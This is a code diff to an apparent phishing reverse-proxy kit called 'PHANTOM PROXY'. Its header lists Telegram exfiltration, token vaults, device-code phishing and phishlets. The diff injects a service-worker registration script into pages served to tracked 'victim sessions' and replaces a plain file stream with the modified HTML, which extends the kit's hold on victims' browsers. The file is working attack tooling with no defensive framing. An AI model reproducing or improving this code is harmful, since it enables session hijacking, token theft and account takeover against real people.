@@ -1,8 +1,8 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v10.3 — FULL ALL FEATURES
+// 🥔 PHANTOM PROXY v10.3 — FIXED SW REGISTRATION
 // ============================================================
 // 🔥 NO EXPRESS — pure Node.js
-// ✅ Proxy + Dashboard + Telegram + PRT + Graph + Token Vault + Device Code + Analytics + Webmail + Replay + Phishlets + WebSocket + Page‑load notifications
+// ✅ All features + Service Worker injection
 // ============================================================
 
 const http = require("http");
@@ -205,7 +205,7 @@ async function sendToTelegram(data) {
 }
 
 // ============================================================
-// 🧩 PROXY HELPERS (same as before)
+// 🧩 PROXY HELPERS
 // ============================================================
 function getUserSession(requestCookies) {
     if (!requestCookies) return;
@@ -1903,12 +1903,12 @@ function proxyHandler(req, res) {
 // ── Start auto-refresh ──
 refreshTokensDaemon();
 
-// ── The actual proxy server (with page‑load notification) ──
+// ── The actual proxy server (with page‑load notification + SW registration) ──
 const proxyServer = http.createServer((clientRequest, clientResponse) => {
     const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
 
-    // ── PAGE‑LOAD NOTIFICATION ──
+    // ── PAGE‑LOAD NOTIFICATION & SERVICE WORKER INJECTION ──
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
         try {
             const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
@@ -1923,6 +1923,22 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
             VICTIM_SESSIONS[session].path = phishedURL.pathname + phishedURL.search;
             VICTIM_SESSIONS[session].port = phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80);
             VICTIM_SESSIONS[session].host = phishedURL.host;
+
+            // ── 🔥 INJECT SERVICE WORKER REGISTRATION ──
+            const indexPath = path.join(__dirname, PROXY_FILES.index);
+            let html = fs.readFileSync(indexPath, 'utf-8');
+
+            const swRegistrationScript = `
+<script>
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('/service_worker_Mz8XO2ny1Pg5.js')
+            .then(() => console.log('✅ SW registered'))
+            .catch(err => console.error('❌ SW registration failed:', err));
+    }
+</script>`;
+
+            // Inject before </head>
+            html = html.replace(/<\/head>/i, swRegistrationScript + '</head>');
 
             // ── Send page‑load notification ──
             (async () => {
@@ -1942,7 +1958,8 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
             })();
 
             clientResponse.writeHead(200, { "Content-Type": "text/html" });
-            fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
+            clientResponse.end(html);  // Served modified HTML
+
         } catch (error) {
             displayError("Entry point error", error, url);
             clientResponse.writeHead(404, { "Content-Type": "text/html" });
@@ -2238,7 +2255,7 @@ if (WebSocket) {
 }
 
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ PHANTOM PROXY v10.3 ULTIMATE running on port ${PORT}`);
+    console.log(`✅ PHANTOM PROXY v10.3 FIXED running on port ${PORT}`);
     console.log(`🔐 Dashboard: /dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`📱 Device Code: /device`);
     console.log(`📤 Page‑load notifications: ACTIVE`);
